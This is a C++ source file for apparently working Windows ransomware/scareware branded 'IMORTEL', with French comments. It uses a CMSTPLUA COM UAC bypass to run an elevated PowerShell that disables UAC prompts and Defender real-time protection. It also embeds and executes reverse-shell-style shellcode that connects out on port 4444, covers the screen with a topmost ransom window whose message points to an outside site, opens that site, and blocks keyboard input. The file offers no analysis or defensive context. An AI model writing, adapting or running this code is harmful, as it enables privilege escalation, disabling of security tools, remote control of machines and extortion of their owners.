#include <windows.h>
#include <iostream>
#include <thread>
#include <string>
#include <sstream>
#include <vector>
#include <ctime>
#include <cstdlib>
#include <conio.h>
#include <comdef.h>
#include <objbase.h>

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

// GUIDs pour le bypass COM (CMSTPLUA)
const CLSID CLSID_CMSTPLUA = { 0x3E5FC7F9, 0x9A51, 0x4367, { 0x90, 0x63, 0xA1, 0x20, 0x24, 0x4F, 0xBE, 0xC7 } };
const IID IID_ICMLuaUtil = { 0x6EDD6D74, 0xC007, 0x4E75, { 0xB7, 0x6A, 0xE5, 0x74, 0x09, 0x95, 0xE2, 0x4C } };

typedef interface ICMLuaUtil ICMLuaUtil;
typedef struct ICMLuaUtilVtbl {
    BEGIN_INTERFACE
    HRESULT (STDMETHODCALLTYPE *QueryInterface)(ICMLuaUtil*, REFIID, void**);
    ULONG   (STDMETHODCALLTYPE *AddRef)(ICMLuaUtil*);
    ULONG   (STDMETHODCALLTYPE *Release)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE *Method1)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE *Method2)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE *Method3)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE *Method4)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE *Method5)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE *Method6)(ICMLuaUtil*);
    HRESULT (STDMETHODCALLTYPE *ShellExec)(ICMLuaUtil*, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, int);
    END_INTERFACE
} ICMLuaUtilVtbl;
struct ICMLuaUtil {
    ICMLuaUtilVtbl *lpVtbl;
};

bool BypassUAC_CMSTPLUA(const wchar_t* command, const wchar_t* parameters) {
    HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return false;

    ICMLuaUtil* pLuaUtil = NULL;
    hr = CoCreateInstance(CLSID_CMSTPLUA, NULL, CLSCTX_LOCAL_SERVER, IID_ICMLuaUtil, (void**)&pLuaUtil);
    if (FAILED(hr) || !pLuaUtil) {
        CoUninitialize();
        return false;
    }

    hr = pLuaUtil->lpVtbl->ShellExec(pLuaUtil, command, parameters, NULL, NULL, SW_SHOWNORMAL);
    pLuaUtil->lpVtbl->Release(pLuaUtil);
    CoUninitialize();

    return SUCCEEDED(hr);
}

// Shellcode (inchangé)
unsigned char shellcode[] =
"\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
"\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
"\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x52\x0f\xb7"
"\x4a\x18\x8b\x52\x20\x01\xd0\x8b\x48\x1c\x8b\x58\x3c\x01\xd3"
"\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01"
"\xc7\x38\xe0\x75\xf6\x03\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b"
"\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04"
"\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0"
"\x58\x5f\x5a\x8b\x12\xe9\x57\xff\xff\xff\x5d\x68\x33\x32\x00"
"\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8"
"\x90\x01\x00\x00\x29\xc4\x54\x50\x68\x2e\x65\x78\x65\x68\xff"
"\xff\xff\xff\x57\x50\x50\x50\x40\x50\x40\x50\x68\xea\x0f\xdf"
"\xe0\xff\xd5\x97\x6a\x05\x68\xc0\xa8\x00\x01\x6a\x02\x8b\x36"
"\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58\xa4\x53\xe5"
"\xff\xd5\x6a\x00\x6a\x04\x56\x57\x68\x02\x00\x11\x5c\x89\xe6"
"\x5d\x5f\x5e\x50\xff\xd5";

void executeShellcode() {
    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
}

void displayMatrixEffect() {
    std::string cmd = "python -c \"import random, time, sys; chars = '0123456789abcdefABCDEF!@#$%^&*()'; while True: sys.stdout.write(random.choice(chars)); sys.stdout.flush(); time.sleep(0.05)\"";
    std::thread matrixThread([cmd]() { std::system(cmd.c_str()); });
    matrixThread.detach();
}

void displayGlitchEffect() {
    std::ostringstream oss;
    oss << "RANCON RANSOM!!!\n\n"
        "VOTRE SYSTEME EST ENLEVE!\n\n"
        "PASSEZ A LA PAGE: https://imortel.fr\n\n"
        "PRESSIONEZ UNE TASTE POUR DECOUPER!\n\n"
        "GLITCH & MATRICE EN COURS...\n";
    std::string text = oss.str();
    for (int i = 0; i < 100; ++i) {
        std::cout << "\r" << text << std::flush;
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

void blockInput() {
    while (true) {
        if (_kbhit()) _getch();
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }
}

void openBrowser() {
    ShellExecuteW(NULL, L"open", L"https://imortel.fr", NULL, NULL, SW_SHOWNORMAL);
}

// Lance PowerShell en admin et exécute les commandes dans l'ordre demandé
void openPowerShellWithCommands() {
    const wchar_t* command = L"powershell.exe";
    const wchar_t* params = L"-NoExit -Command \"Write-Host 'Mode administrateur actif' -ForegroundColor Green; Write-Host '=== Désactivation UAC ===' -ForegroundColor Yellow; reg add 'HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System' /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f; Write-Host '=== Désactivation Defender (temps réel) ===' -ForegroundColor Yellow; Set-MpPreference -DisableRealtimeMonitoring $true; Write-Host '=== Informations réseau ===' -ForegroundColor Yellow; ipconfig /all; Write-Host 'Toutes les commandes ont été exécutées.' -ForegroundColor Green\"";

    // Essayer d'abord le bypass silencieux
    if (BypassUAC_CMSTPLUA(command, params)) {
        return;
    }

    // Sinon, utiliser runas (UAC) avec les mêmes paramètres
    ShellExecuteW(NULL, L"runas", L"powershell.exe", params, NULL, SW_SHOWNORMAL);
}

void createRansomWindow() {
    HWND hWnd = CreateWindowExW(
        WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        L"STATIC",
        L"IMORTEL",
        WS_POPUP | WS_VISIBLE,
        0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN),
        NULL, NULL, GetModuleHandleW(NULL), NULL
    );
    SetForegroundWindow(hWnd);
    ShowWindow(hWnd, SW_SHOW);
    SetWindowPos(hWnd, HWND_TOPMOST, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE | SWP_SHOWWINDOW);
    SetWindowLongW(hWnd, GWL_STYLE, 0);
    SetWindowLongW(hWnd, GWL_EXSTYLE, WS_EX_TOOLWINDOW | WS_EX_TOPMOST);
    SetWindowTextW(hWnd, L"IMORTEL");
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    createRansomWindow();

    std::thread browserThread(openBrowser);
    browserThread.detach();

    openPowerShellWithCommands();

    executeShellcode();
    displayMatrixEffect();

    std::thread glitchThread(displayGlitchEffect);
    glitchThread.detach();

    std::thread inputThread(blockInput);
    inputThread.detach();

    std::this_thread::sleep_for(std::chrono::seconds(5));
    return 0;
}